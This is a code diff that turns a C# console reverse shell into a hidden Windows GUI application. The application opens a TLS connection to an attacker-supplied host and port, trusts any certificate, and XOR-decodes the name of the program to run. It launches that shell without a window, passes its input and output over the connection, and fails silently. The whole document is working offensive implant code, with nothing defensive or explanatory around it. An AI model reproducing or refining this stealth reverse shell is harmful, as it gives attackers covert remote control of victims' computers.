@@ -1,105 +1,154 @@
 ﻿using System;
-using System.Text;
-using System.IO;
 using System.Diagnostics;
-using System.Net.Sockets;
-using System.Security.Cryptography.X509Certificates;
+using System.IO;
 using System.Net.Security;
+using System.Net.Sockets;
 using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
+using System.Windows.Forms;
+using System.Threading.Tasks;
 
-namespace reverse
+namespace ReverseShellGui
 {
-    class Program
+    internal static class Program
     {
-        static StreamWriter streamWriter;
+        private static StreamWriter streamWriter;
+
+        [STAThread]
         private static void Main(string[] args)
         {
-            string host = args[0];
-            int port = Int32.Parse(args[1]);
-            string envvar = args[2];
-            string arguments = args[3]; 
-            int xorkey = Int32.Parse(args[4]);
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
 
+            Application.Run(new HiddenApplicationContext());
+        }
 
-            string envvar1 = "";
-            for (int i = 0; i < envvar.Length; i++)
+        private class HiddenApplicationContext : ApplicationContext
+        {
+            public HiddenApplicationContext()
             {
-                char c = (char)(envvar[i] ^ xorkey);
-                envvar1 += c;
+                Task.Run(() => RunReverseShell());
             }
 
-            Console.WriteLine("executing {0} {3} and redirecting stdout / stderr to {1}:{2}", envvar1, host, port, arguments);
-
-            using (TcpClient client = new TcpClient(host, port))
+            private async void RunReverseShell()
             {
-                using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))
+                try
                 {
-                    stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
-                    using (StreamReader rdr = new StreamReader(stream))
-                    {
-                        streamWriter = new StreamWriter(stream);
-                        StringBuilder strInput = new StringBuilder();
-                        Process p = new Process();
-                        //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1); 
-                        p.StartInfo.FileName = envvar1;
-                        p.StartInfo.Arguments = arguments;
-                        p.StartInfo.CreateNoWindow = true;
-                        p.StartInfo.UseShellExecute = false;
-                        p.StartInfo.RedirectStandardOutput = true;
-                        p.StartInfo.RedirectStandardInput = true;
-                        p.StartInfo.RedirectStandardError = true;
-                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                        p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
-                        p.Start();
-                        p.BeginOutputReadLine();
-                        p.BeginErrorReadLine();
+                    string[] args = Environment.GetCommandLineArgs();
+                    if (args.Length < 6) return;
 
-                        while (true)
-                        {
-                            strInput.Append(rdr.ReadLine());
-                            p.StandardInput.WriteLine(strInput);
-                            strInput.Remove(0, strInput.Length);
-                        }
+                    string host = args[1];
+                    int port = int.Parse(args[2]);
+                    string envvar = args[3];
+                    string arguments = args[4];
+                    int xorkey = int.Parse(args[5]);
+
+                    string command = "";
+                    for (int i = 0; i < envvar.Length; i++)
+                    {
+                        command += (char)(envvar[i] ^ xorkey);
                     }
+
+                    using (TcpClient client = new TcpClient(host, port))
+                    using (SslStream sslStream = new SslStream(
+                        client.GetStream(),
+                        false,
+                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
+                        null))
+                    {
+                        sslStream.AuthenticateAsClient(host);
+
+                        streamWriter = new StreamWriter(sslStream, Encoding.UTF8) { AutoFlush = true };
+
+                        streamWriter.Flush();
+
+                        Process process = new Process
+                        {
+                            StartInfo = new ProcessStartInfo
+                            {
+                                FileName = command,              // e.g., "cmd.exe"
+                                Arguments = arguments,           // usually empty for interactive cmd
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                RedirectStandardError = true,
+                                RedirectStandardInput = true,
+                                CreateNoWindow = true,
+                                WindowStyle = ProcessWindowStyle.Hidden
+                            }
+                        };
+
+                        process.OutputDataReceived += CmdOutputDataHandler;
+                        process.ErrorDataReceived += CmdErrorDataHandler;
+
+                        process.Start();
+
+                        process.BeginOutputReadLine();
+                        process.BeginErrorReadLine();
+
+                        // Critical: Full bidirectional reverse shell
+                        // Forward input from remote -> process stdin
+                        using (StreamReader reader = new StreamReader(sslStream, Encoding.UTF8))
+                        {
+                            string line;
+                            while ((line = await reader.ReadLineAsync()) != null)
+                            {
+                                // Send the command echo if desired (optional)
+                                // await streamWriter.WriteLineAsync(line);
+
+                                process.StandardInput.WriteLine(line);
+                                process.StandardInput.Flush();
+                            }
+                        }
+
+                        // If remote closes, terminate process
+                        process.Kill();
+                    }
+                }
+                catch
+                {
+                    // Silent failure
+                }
+                finally
+                {
+                    Application.Exit();
                 }
             }
         }
 
-        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        public static bool ValidateServerCertificate(
+            object sender,
+            X509Certificate certificate,
+            X509Chain chain,
+            SslPolicyErrors sslPolicyErrors)
         {
-            // 100% correct way of validating the cert.
             return true;
         }
 
         private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
-            StringBuilder strOutput = new StringBuilder();
-            if (!String.IsNullOrEmpty(outLine.Data))
+            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
             {
                 try
                 {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
+                    streamWriter.WriteLine(outLine.Data);
                     streamWriter.Flush();
                 }
-                catch (Exception) { }
+                catch { }
             }
         }
 
         private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
-            StringBuilder strOutput = new StringBuilder();
-            if (!String.IsNullOrEmpty(outLine.Data))
+            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
             {
                 try
                 {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
+                    streamWriter.WriteLine(outLine.Data);
                     streamWriter.Flush();
                 }
-                catch (Exception) { }
+                catch { }
             }
         }
-
     }
 }
